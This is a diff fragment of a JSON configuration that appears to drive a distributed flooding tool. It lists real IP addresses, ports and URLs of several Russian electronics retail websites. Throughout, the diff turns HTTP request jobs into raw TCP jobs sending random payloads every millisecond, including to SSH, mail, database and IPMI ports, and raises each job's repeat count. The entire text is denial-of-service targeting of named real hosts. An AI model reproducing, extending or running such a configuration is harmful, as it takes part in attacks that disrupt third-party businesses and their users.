-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://mikron.ru/products/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "90.156.201.35:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "90.156.201.35:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -6250,58 +5180,29 @@
         "client": {
           "static_host": {
             "addr": "90.156.201.35:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://mikron.ru/products/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "90.156.201.35:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://e-components.ru/catalog/istochniki-pitaniya-vneshnie-vstraivaemye/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.184.79.108:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://e-components.ru/catalog/istochniki-pitaniya-vneshnie-vstraivaemye/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.184.79.108:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
+      "args": {
+        "address": "185.184.79.108:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "185.184.79.108:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
       "args": {
         "address": "185.184.79.108:3326",
         "body": "{{ random_payload 10 }}",
@@ -6309,30 +5210,23 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "185.184.79.108:5432",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://e-components.ru/catalog/istochniki-pitaniya-vneshnie-vstraivaemye/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.184.79.108:8080",
-            "is_tls": "false"
-          }
-        }
+        "address": "185.184.79.108:8080",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "185.184.79.108:50011",
         "body": "{{ random_payload 10 }}",
@@ -6340,45 +5234,39 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "46.255.97.130:21",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://micel.ru/catalog/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.255.97.130:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "46.255.97.130:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "46.255.97.130:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "37.140.192.37:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://micel.ru/catalog/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.255.97.130:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -6392,38 +5280,16 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://micro-bond.com/moskva/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "37.140.192.37:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "37.140.192.37:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://micro-bond.com/moskva/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "37.140.192.37:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -6438,7 +5304,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "91.221.70.44:21",
         "body": "{{ random_payload 10 }}",
@@ -6446,30 +5312,23 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "91.221.70.44:25",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.protehnology.ru/destinationcatalog/Soldering-stations"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.221.70.44:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "91.221.70.44:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "91.221.70.44:81",
         "body": "{{ random_payload 10 }}",
@@ -6477,11 +5336,11 @@
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://www.protehnology.ru/destinationcatalog/Soldering-stations"
+          "path": "http://www.protehnology.ru/destinationcatalog/Soldering-stations"
         },
         "client": {
           "static_host": {
@@ -6492,7 +5351,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "91.221.70.44:110",
         "body": "{{ random_payload 10 }}",
@@ -6500,30 +5359,23 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "91.221.70.44:143",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.protehnology.ru/destinationcatalog/Soldering-stations"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.221.70.44:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "91.221.70.44:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "91.221.70.44:465",
         "body": "{{ random_payload 10 }}",
@@ -6531,7 +5383,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "91.221.70.44:623",
         "body": "{{ random_payload 10 }}",
@@ -6539,99 +5391,86 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "91.221.70.44:1500",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "tcp",
-      "count": 3,
+      "type": "http",
+      "count": 7,
       "args": {
-        "address": "91.221.70.44:1500",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
+        "request": {
+          "method": "GET",
+          "path": "https://www.protehnology.ru/destinationcatalog/Soldering-stations"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.221.70.44:1500",
+            "is_tls": "true"
+          }
+        }
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "94.228.116.98:22",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.micro-electronics.ru/catalog/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "94.228.116.98:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.micro-electronics.ru/catalog/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "94.228.116.98:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "94.228.116.98:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
+      "args": {
+        "address": "94.228.116.98:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
       "args": {
         "address": "94.228.116.98:8070",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://elektronika.store/collection/iphone"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.178.208.134:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "185.178.208.134:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "185.178.208.134:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "95.213.159.133:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://elektronika.store/collection/iphone"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.178.208.134:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -6645,38 +5484,16 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.landcom.ru/catalog/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "95.213.159.133:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "95.213.159.133:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.landcom.ru/catalog/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "95.213.159.133:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -6691,7 +5508,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "95.213.159.133:2759",
         "body": "{{ random_payload 10 }}",
